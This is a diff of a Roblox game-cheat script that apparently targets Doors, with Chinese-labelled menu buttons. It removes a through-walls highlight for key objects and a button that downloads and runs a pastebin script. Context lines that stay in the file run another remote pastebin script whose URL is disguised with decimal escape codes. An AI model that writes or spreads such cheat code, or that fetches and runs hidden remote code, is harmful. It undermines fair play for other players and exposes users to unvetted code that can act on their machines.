@@ -1101,46 +1101,6 @@ Tab:AddButton({
     local item = game:GetObjects("rbxassetid://11697889137")[1]item.Parent = game.Players.LocalPlayer.Backpack
   end
 })
-local KeyChams = {}
-Tab:AddToggle({
-	Name = "钥匙显示",
-	Default = false,
-    Flag = "KeyToggle",
-    Save = true,
-	Callback = function(Value)
-		for i,v in pairs(KeyChams) do
-            v.Enabled = Value
-        end
-	end    
-})
-
-local function ApplyKeyChams(inst)
-    wait()
-    local Cham = Instance.new("Highlight")
-    Cham.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-    Cham.FillColor = Color3.new(0.980392, 0.670588, 0)
-    Cham.FillTransparency = 0.5
-    Cham.OutlineColor = Color3.new(0.792156, 0.792156, 0.792156)
-    Cham.Parent = game:GetService("CoreGui")
-    Cham.Adornee = inst
-    Cham.Enabled = OrionLib.Flags["KeyToggle"].Value
-    Cham.RobloxLocked = true
-    return Cham
-end
-
-local KeyCoroutine = coroutine.create(function()
-    workspace.CurrentRooms.DescendantAdded:Connect(function(inst)
-        if inst.Name == "KeyObtain" then
-            table.insert(KeyChams,ApplyKeyChams(inst))
-        end
-    end)
-end)
-for i,v in ipairs(workspace:GetDescendants()) do
-    if v.Name == "KeyObtain" then
-        table.insert(KeyChams,ApplyKeyChams(v))
-    end
-end
-coroutine.resume(KeyCoroutine)
 Tab:AddButton({
 	Name = "神圣手雷（炸到自己黑屏）",
 	Callback = function()
@@ -1270,13 +1230,6 @@ Tab:AddButton({
   Callback = function()
     loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
   end
-})
- 
- Tab:AddButton({
-	Name = "rc",
-	Callback = function()
-loadstring(game:HttpGet("https://pastebin.com/raw/HkfMzPG6"))()
-end
 })
 
 Tab:AddButton({
